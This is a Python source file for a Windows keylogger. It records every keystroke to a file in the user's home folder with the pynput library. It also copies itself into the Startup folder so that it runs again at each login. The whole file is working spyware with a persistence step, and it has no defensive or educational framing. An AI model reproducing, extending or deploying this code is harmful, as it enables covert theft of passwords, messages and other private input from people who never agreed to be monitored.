import os
import re
import shutil
import sys
from pathlib import Path

from pynput.keyboard import Listener

line_length = 0


def key_recorder(key):
    f = open(os.path.join(str(Path.home()), 'logger.txt'), 'a+')
    str_key = str(key)
    global line_length
    line_length += 1
    if line_length >= 50:
        f.write("\n")
        line_length = 0
    if str_key == "Key.enter":
        f.write('\n')
    elif str_key == "Key.space":
        f.write(" ")
    elif str_key == "Key.backspace":
        f.write(" {del} ")
        #     size = f.tell()  # the size...
        #     f.truncate(size - 1)
    elif len(re.findall(r'Key.([\w\d]+)', str_key)) > 0:
        if len(re.findall(r'Key.([\w\d]+)', str_key)[0]) > 1:
            f.write("")
    elif len(re.findall(r'(x[\d]+)', str_key)) > 0:
        f.write('')
    elif len(re.findall(r'<([\d]+)>', str_key)) > 0:
        if int(re.findall(r'<([\d]+)>', str_key)[0]) - 96 < 10:
            f.write(str(int(re.findall(r'<([\d]+)>', str_key)[0]) - 96))
        elif re.findall(r'<([\d]+)>', str_key)[0] == '110':
            f.write('.')
    else:
        print(str_key)
        f.write(str_key.replace("'", ""))


def copy_to_startup_folder():
    try:
        file_name = re.findall(r'([^\\w\d\W]+).(py|exe|pyw)', sys.argv[0])[0][0] + ".exe"

        shutil.copy(sys.argv[0],
                    os.path.join(str(Path.home()), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu',
                                 'Programs',
                                 'Startup',
                                 file_name))

        return False
    except shutil.SameFileError:
        print('File is in startup folder')
        return True


if __name__ == '__main__':
    if '.exe' in sys.argv[0]:

        if copy_to_startup_folder():
            with Listener(on_press=key_recorder) as listener:
                listener.join()
